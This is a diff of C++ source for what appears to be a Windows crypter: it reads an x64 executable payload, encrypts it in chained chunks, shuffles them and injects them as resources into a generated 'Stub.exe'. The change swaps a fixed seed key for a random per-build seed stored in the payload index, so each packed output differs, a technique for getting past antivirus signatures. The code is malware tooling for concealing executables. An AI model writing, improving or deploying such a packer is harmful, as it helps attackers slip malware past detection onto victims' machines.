@@ -15,7 +15,7 @@
 using namespace std;
 
 #define MAGIC_VALUE        0x474E5089
-#define AES_SEED_KEY       ((uint8_t)(MAGIC_VALUE & 0xFF))
+// #define AES_SEED_KEY       ((uint8_t)(MAGIC_VALUE & 0xFF))
 #define DEFAULT_OUTPUT     "Stub.exe"
 
 // ============================================================================
@@ -387,7 +387,8 @@ std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long s
 // ============================================================================
 // FIXED RESOURCE INJECTION WITH PROPER ERROR CHECKING
 // ============================================================================
-bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, long payloadSize, uint8_t first_key) {
+bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, 
+                             long payloadSize, uint8_t seed_key) {
     cout << "[*] Starting resource injection with shuffle..." << endl;
     
     DWORD attrib = GetFileAttributesA(g_outputFile.c_str());
@@ -417,9 +418,9 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
     
     uint16_t shuffle_seed = (uint16_t)(GetTickCount() ^ rand());
     
-    PayloadIndex index{};
+     PayloadIndex index{};
     index.magic     = MAGIC_VALUE;
-    index.first_key = AES_SEED_KEY; 
+    index.first_key = seed_key;  // Store the seed in metadata
     index.total_size = static_cast<uint32_t>(payloadSize);
     index.chunk_count = static_cast<uint16_t>(encrypted_chunks.size());
     index.first_chunk_id = first_chunk_id;
@@ -612,11 +613,16 @@ int main(int argc, char* argv[]) {
     }
     cout << "[+] Payload read: " << size << " bytes" << endl;
     
+    srand(static_cast<unsigned int>(time(nullptr)));
+    uint8_t random_seed = static_cast<uint8_t>(rand() % 256);
+
     if (!ValidatePEArchitecture(fileBuffer)) {
         Cleanup();
         system("pause");
         return 1;
     }
+
+
     cout << "[+] Valid x64 PE confirmed" << endl;
     
     if (!WriteStubToFile()) {
@@ -628,7 +634,7 @@ int main(int argc, char* argv[]) {
     Sleep(100);
     
     cout << "[*] Starting encryption process..." << endl;
-    auto chunks = EncryptPayloadChained(fileBuffer, size, AES_SEED_KEY);
+    auto chunks = EncryptPayloadChained(fileBuffer, size, random_seed);
     
     if (chunks.empty()) {
         cerr << "[-] Encryption produced no chunks!" << endl;
@@ -638,7 +644,7 @@ int main(int argc, char* argv[]) {
     }
     
     cout << "[*] Encryption completed, injecting resources..." << endl;
-    if (!InjectWithSeparateIndex(chunks, size, AES_SEED_KEY)) {
+ if (!InjectWithSeparateIndex(chunks, size, random_seed)) {
         Cleanup();
         system("pause");
         return 1;
